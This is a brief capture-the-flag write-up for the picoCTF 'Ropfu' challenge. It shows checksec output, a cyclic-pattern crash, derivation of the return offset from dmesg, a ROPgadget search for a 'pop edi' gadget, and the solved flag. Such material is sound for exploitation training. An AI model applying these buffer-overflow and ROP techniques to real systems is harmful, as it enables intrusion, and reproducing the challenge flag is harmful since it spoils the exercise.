# Exp

# Flag: picoCTF{5n47ch_7h3_5h311_5b4fc869}

file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=3aa2bb6a5bf44d90a355da83fa909bbf5d9d90ce, for GNU/Linux 3.2.0, not stripped

checksec vuln       
[*] '/home/user/picoCTF/Ropfu/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

msf-pattern_create -l 120         
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9

./vuln                    
How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9
zsh: segmentation fault  ./vuln

sudo dmesg | tail
[sudo] password for user: 
[102413.420376] Code: Unable to access opcode bytes at RIP 0xffffffffffffffd7.
[103354.376276] tun: Universal TUN/TAP device driver, 1.6
[180187.908769] device eth0 entered promiscuous mode
[180188.879088] device eth0 left promiscuous mode
[182137.794315] code[566039]: segfault at 0 ip 00007f243b697ff9 sp 00007ffc354818a0 error 4 in watcher.node[7f243b684000+4a000]
[182137.794364] Code: f6 eb 23 4c 89 f0 4c 09 e0 48 c1 e8 20 74 0d 4c 89 f0 31 d2 49 f7 f4 48 89 d6 eb 0a 44 89 f0 31 d2 41 f7 f4 89 d6 49 8b 45 00 <48> 8b 04 f0 48 85 c0 0f 84 99 01 00 00 44 0f b6 2b 41 f6 c5 01 74
[199357.957116] vuln[954714]: segfault at 686b6668 ip 00000000686b6668 sp 00000000ffbf5720 error 14
[199357.957135] Code: Unable to access opcode bytes at RIP 0x686b663e.
[199751.851878] vuln[956724]: segfault at 62413961 ip 0000000062413961 sp 00000000ffaf5bd0 error 14
[199751.851885] Code: Unable to access opcode bytes at RIP 0x62413937.

msf-pattern_offset -l 120 -q 62413961
[*] Exact match at offset 28

## Offset is 28

Find a pop edi

ROPgadget --binary vuln | grep 'pop edi'

## pop edi; ret at address 0x0804b28f

or `ROPgadget --ropchain --binary vuln` generate the python code you need